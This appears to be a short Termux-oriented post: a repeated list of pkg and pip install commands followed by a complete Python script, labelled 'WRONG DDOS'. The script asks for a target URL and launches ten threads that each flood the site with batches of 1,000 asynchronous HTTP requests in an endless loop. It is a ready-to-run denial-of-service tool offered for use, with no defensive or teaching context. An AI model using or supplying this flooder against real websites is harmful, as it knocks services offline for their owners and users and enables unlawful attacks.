pkg update && pkg upgrade
pkg install python
pip install requests
pip install requests
pip install aiohttp
pip install asyncio
pip install aiohttp
pkg install pip
pkg install python
pip install asyncio
pip install aiohttp




import aiohttp
import asyncio
import threading
import time

# Settings
REQUESTS_PER_BATCH = 1000
INTERVAL_BETWEEN_REQUESTS = 0.1
ACTIVE_DURATION = 60  # seconds
PAUSE_DURATION = 1    # seconds

print("WELCOME TO WRONG DDOS")

async def flood(session, url):
    try:
        async with session.get(url) as response:
            await response.read()
    except:
        pass

async def run_batch(url):
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        tasks = [flood(session, url) for _ in range(REQUESTS_PER_BATCH)]
        await asyncio.gather(*tasks)

def attack_loop(target):
    while True:
        start_time = time.time()
        while time.time() - start_time < ACTIVE_DURATION:
            asyncio.run(run_batch(target))
            print(f"DDOS Attacking {target}...")
            time.sleep(INTERVAL_BETWEEN_REQUESTS)
        print("Pausing for 1 second...")
        time.sleep(PAUSE_DURATION)

if __name__ == "__main__":
    target = input("Input target website (include http/https): ")
    for _ in range(10):  # Spawn multiple attack threads
        threading.Thread(target=attack_loop, args=(target,), daemon=True).start()
    while True:
        time.sleep(2)
